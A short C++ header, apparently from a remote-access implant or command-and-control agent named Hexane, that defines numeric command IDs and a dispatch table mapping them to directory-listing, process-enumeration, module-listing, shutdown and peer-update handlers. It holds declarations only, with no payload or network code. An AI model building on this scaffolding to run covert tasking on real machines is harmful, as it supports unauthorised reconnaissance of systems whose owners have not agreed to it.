#ifndef HEXANE_CORELIB_COMMANDS_HPP
#define HEXANE_CORELIB_COMMANDS_HPP
#include <core/corelib.hpp>

enum CommandType {
	CommandDir          	= 0x00000001,
	CommandMods         	= 0x00000002,
	CommandNoJob        	= 0x00000003,
	CommandShutdown     	= 0x00000004,
	CommandUpdatePeer   	= 0x00000005,
	CommandProcess 		= 0x00000006,
};

namespace Commands {
	FUNCTION VOID DirectoryList (PPARSER Parser);
	FUNCTION VOID ProcessModules (PPARSER Parser);
	FUNCTION VOID EnumProcesses (PPARSER Parser);
    FUNCTION VOID Shutdown(PPARSER Parser);
	FUNCTION VOID UpdatePeer(PPARSER Parser);
}

RDATA_SECTION COMMAND_MAP CmdMap[] = {
	{ .Id = CommandDir,         .Function = Commands::DirectoryList },
	{ .Id = CommandMods,        .Function = Commands::ProcessModules },
	{ .Id = CommandProcess,     .Function = Commands::EnumProcesses },
	{ .Id = CommandUpdatePeer,  .Function = Commands::UpdatePeer },
	{ .Id = CommandShutdown,    .Function = Commands::Shutdown },
	{ .Id = 0,                  .Function = nullptr }
};

#endif //HEXANE_CORELIB_COMMANDS_HPP